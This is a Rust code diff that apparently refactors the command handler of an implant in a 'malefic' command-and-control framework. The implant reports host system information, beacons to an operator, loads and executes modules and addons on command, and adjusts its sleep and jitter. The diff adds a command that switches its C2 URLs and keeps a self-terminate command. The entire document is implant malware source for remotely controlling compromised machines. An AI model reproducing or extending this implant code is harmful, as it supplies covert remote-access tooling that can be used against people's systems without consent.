@@ -1,26 +1,30 @@
-use std::str::FromStr;
-use async_std::task::sleep;
-use std::time::Duration;
 use anyhow::anyhow;
+use futures::SinkExt;
+use futures::StreamExt;
+use futures_timer::Delay;
 use lazy_static::lazy_static;
-use malefic_core::common::error::MaleficError;
-use malefic_core::manager::manager::MaleficManager;
-use malefic_core::manager::internal::InternalModule;
-use malefic_core::scheduler::TaskOperator;
-use malefic_helper::debug;
-use malefic_proto::proto::modulepb;
-use malefic_proto::{marshal, new_error_spite, new_spite};
-use malefic_proto::proto::implantpb;
-use malefic_proto::proto::implantpb::spite::Body;
-use malefic_proto::proto::implantpb::{Spite, Spites};
-use malefic_core::{check_body, config};
-use malefic_core::transport::{Client, SafeTransport};
-use crate::meta::MetaConfig;
-use crate::malefic::MaleficChannel;
+use std::str::FromStr;
+use std::time::Duration;
 
-lazy_static!(
-    pub static ref EMPTY_SPITES: Spites = Spites { spites: vec![Spite::default()] };
-);
+use crate::malefic::MaleficChannel;
+use crate::meta::MetaConfig;
+use malefic_core::common::error::MaleficError;
+use malefic_core::manager::internal::InternalModule;
+use malefic_core::manager::manager::MaleficManager;
+use malefic_core::scheduler::TaskOperator;
+use malefic_core::transport::{Client, Transport};
+use malefic_core::{check_body, config};
+use malefic_helper::debug;
+use malefic_proto::proto::{modulepb, implantpb, implantpb::{Spite, Spites}, implantpb::spite::Body};
+use malefic_proto::{marshal, new_error_spite, new_spite};
+
+
+
+lazy_static! {
+    pub static ref EMPTY_SPITES: Spites = Spites {
+        spites: vec![Spite::default()]
+    };
+}
 
 pub struct MaleficStub {
     pub(crate) manager: MaleficManager,
@@ -41,11 +45,11 @@ impl MaleficStub {
             panic!("origin modules refresh failed");
         }
     }
-    
+
     pub fn register_spite(&mut self) -> Spite {
         let sysinfo = malefic_core::common::sys::get_register_info();
         debug!("sysinfo: {:#?}", sysinfo);
-        
+
         new_spite(
             0,
             "register".to_string(),
@@ -67,32 +71,32 @@ impl MaleficStub {
         self.channel.data_sender.send(spite).await?;
         Ok(())
     }
-    
+
     pub async fn process_data(
         &mut self,
-        transport: SafeTransport,
+        transport: Transport,
         client: &mut Client,
     ) -> Result<(), anyhow::Error> {
-        let _ = self.channel.request_sender.send(true).await?;
-        
+        self.channel.request_sender.send(true).await?;
 
-        let spites = if let Ok(data) = self.channel.response_receiver.recv().await {
+        let spites = if let Some(data) = self.channel.response_receiver.next().await {
             data
         } else {
             EMPTY_SPITES.clone()
         };
+        debug!("spites: {:#?}", spites);
         let marshaled = marshal(self.meta.get_uuid(), spites.clone())?;
-        if let Ok(res) = client.handler(transport.clone(), marshaled).await{
-            match res{
+        if let Ok(res) = client.handler(transport.clone(), marshaled).await {
+            match res {
                 Some(spite_data) => {
                     let spites = spite_data.parse()?;
                     self.handler(spites).await?;
-                },
+                }
                 None => {
                     debug!("[beacon] no recv");
                 }
             }
-        }else{
+        } else {
             debug!("[beacon] send error, recover spites");
             for spite in spites.spites {
                 self.push(spite).await?;
@@ -102,7 +106,6 @@ impl MaleficStub {
         Ok(())
     }
 
-    
     pub async fn handler(&mut self, spites: Spites) -> anyhow::Result<()> {
         for spite in spites.spites {
             #[cfg(debug_assertions)]
@@ -116,38 +119,39 @@ impl MaleficStub {
             match self.handler_spite(spite.clone()).await {
                 Ok(_) => {
                     debug!("{}:{} sender succ", spite.task_id, spite.name)
-                },
+                }
                 Err(e) => {
                     debug!("handler encountered an error: {:#?}", e);
-                    let error_id = if let Some(malefic_error) =
-                        e.downcast_ref::<MaleficError>()
-                    {
+                    let error_id = if let Some(malefic_error) = e.downcast_ref::<MaleficError>() {
                         malefic_error.id()
                     } else {
                         999
                     };
-                    self.push(new_error_spite(spite.task_id, spite.name, error_id)).await?
+                    self.push(new_error_spite(spite.task_id, spite.name, error_id))
+                        .await?
                 }
             }
         }
         Ok(())
     }
 
-    async fn handler_spite(&mut self, spite: Spite) -> anyhow::Result<()> {
-        match InternalModule::from_str(spite.name.as_str()) {
+    pub async fn handler_spite(&mut self, req: Spite) -> anyhow::Result<()> {
+        match InternalModule::from_str(req.name.as_str()) {
             Ok(InternalModule::Ping) => {
-                let ping = check_body!(spite, Body::Ping)?;
+                let ping = check_body!(req, Body::Ping)?;
                 self.push(new_spite(
-                    spite.task_id,
+                    req.task_id,
                     InternalModule::Ping.to_string(),
-                    Body::Ping(modulepb::Ping { nonce: ping.nonce, })
-                )).await?
+                    Body::Ping(modulepb::Ping { nonce: ping.nonce }),
+                ))
+                .await?
             }
             Ok(InternalModule::Init) => {
-                let req = check_body!(spite, Body::Init)?;
-                let id: [u8; 4] = req.data
+                let req = check_body!(req, Body::Init)?;
+                let id: [u8; 4] = req
+                    .data
                     .try_into()
-                    .map_err(|_| anyhow!("Expected a Vec<u8> of length 4"))?; 
+                    .map_err(|_| anyhow!("Expected a Vec<u8> of length 4"))?;
 
                 self.meta.set_id(id);
                 let spite = self.register_spite();
@@ -156,14 +160,15 @@ impl MaleficStub {
             Ok(InternalModule::RefreshModule) => {
                 self.manager.refresh_module()?;
                 self.push(new_spite(
-                    spite.task_id,
+                    req.task_id,
                     InternalModule::RefreshModule.to_string(),
                     Body::Empty(implantpb::Empty::default()),
-                )).await?;
+                ))
+                .await?;
             }
             Ok(InternalModule::ListModule) => {
                 let result = new_spite(
-                    spite.task_id,
+                    req.task_id,
                     InternalModule::ListModule.to_string(),
                     Body::Modules(modulepb::Modules {
                         modules: self.manager.list_module(InternalModule::all()),
@@ -172,25 +177,26 @@ impl MaleficStub {
                 self.push(result).await?;
             }
             Ok(InternalModule::LoadModule) => {
-                self.manager.load_module(spite.clone())?;
+                self.manager.load_module(req.clone())?;
                 self.push(new_spite(
-                        spite.task_id,
-                        InternalModule::LoadModule.to_string(),
-                        Body::Empty(implantpb::Empty::default()),
-                    )).await?;
+                    req.task_id,
+                    InternalModule::LoadModule.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?;
             }
             Ok(InternalModule::LoadAddon) => {
-                self.manager.load_addon(spite.clone())?;
+                self.manager.load_addon(req.clone())?;
                 self.push(new_spite(
-                        spite.task_id,
-                        InternalModule::LoadAddon.to_string(),
-                        Body::Empty(implantpb::Empty::default()),
-                    ))
-                    .await?;
+                    req.task_id,
+                    InternalModule::LoadAddon.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?;
             }
             Ok(InternalModule::ListAddon) => {
                 let result = new_spite(
-                    spite.task_id,
+                    req.task_id,
                     InternalModule::ListAddon.to_string(),
                     Body::Addons(modulepb::Addons {
                         addons: self.manager.list_addon(),
@@ -199,7 +205,7 @@ impl MaleficStub {
                 self.push(result).await?;
             }
             Ok(InternalModule::ExecuteAddon) => {
-                let result = self.manager.execute_addon(spite)?;
+                let result = self.manager.execute_addon(req)?;
                 let module = self
                     .manager
                     .get_module(&result.name)
@@ -213,71 +219,85 @@ impl MaleficStub {
             Ok(InternalModule::RefreshAddon) => {
                 self.manager.refresh_addon()?;
                 self.push(new_spite(
-                        spite.task_id,
-                        InternalModule::RefreshAddon.to_string(),
-                        Body::Empty(implantpb::Empty::default()),
-                    ))
-                    .await?;
+                    req.task_id,
+                    InternalModule::RefreshAddon.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?;
             }
             Ok(InternalModule::Clear) => {
                 self.manager.clean()?;
                 self.push(new_spite(
-                        spite.task_id,
-                        InternalModule::Clear.to_string(),
-                        Body::Empty(implantpb::Empty::default()),
-                    ))
-                    .await?;
+                    req.task_id,
+                    InternalModule::Clear.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?;
             }
             Ok(InternalModule::CancelTask) => {
-                if let Some(Body::Task(task)) = spite.body {
+                if let Some(Body::Task(task)) = req.body {
                     self.channel
                         .scheduler_task_ctrl
-                        .send(TaskOperator::CancelTask(task.task_id))
+                        .send((req.task_id, TaskOperator::CancelTask(task.task_id)))
                         .await?;
                 }
             }
             Ok(InternalModule::QueryTask) => {
-                if let Some(Body::Task(task)) = spite.body {
+                if let Some(Body::Task(task)) = req.body {
                     self.channel
                         .scheduler_task_ctrl
-                        .send(TaskOperator::QueryTask(task.task_id))
+                        .send((req.task_id, TaskOperator::QueryTask(task.task_id)))
                         .await?;
                 }
             }
+            Ok(InternalModule::ListTask) => {
+                self.channel
+                    .scheduler_task_ctrl
+                    .send((req.task_id, TaskOperator::ListTask))
+                    .await?;
+            }
             Ok(InternalModule::Sleep) => {
-                let sleep = check_body!(spite, Body::SleepRequest)?;
+                let sleep = check_body!(req, Body::SleepRequest)?;
                 self.meta.update(sleep.interval, sleep.jitter);
                 self.push(new_spite(
-                        spite.task_id,
-                        InternalModule::Sleep.to_string(),
-                        Body::Empty(implantpb::Empty::default()),
-                    ))
-                    .await?;
+                    req.task_id,
+                    InternalModule::Sleep.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?;
             }
             Ok(InternalModule::Suicide) => {
                 self.push(new_spite(
-                        spite.task_id,
-                        InternalModule::Suicide.to_string(),
-                        Body::Empty(implantpb::Empty::default()),
-                    ))
-                    .await?;
-                sleep(Duration::from_secs(self.meta.interval * 2)).await;
+                    req.task_id,
+                    InternalModule::Suicide.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?;
+                Delay::new(Duration::from_secs(self.meta.interval * 2)).await;
                 std::process::exit(0);
             }
+            Ok(InternalModule::Login) => {
+                let login = check_body!(req, Body::LoginRequest)?;
+                self.meta.update_urls(login.urls);
+                self.push(new_spite(
+                    req.task_id,
+                    InternalModule::Login.to_string(),
+                    Body::Empty(implantpb::Empty::default()),
+                ))
+                .await?
+            }
             Err(_) => {
-                let body = spite.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
+                let body = req.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                 let module = self
                     .manager
-                    .get_module(&spite.name)
+                    .get_module(&req.name)
                     .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                 self.channel
                     .scheduler_task_sender
-                    .send((spite.r#async, spite.task_id, module.new_instance(), body))
+                    .send((req.r#async, req.task_id, module.new_instance(), body))
                     .await?;
             }
         };
         Ok(())
     }
 }
-
-
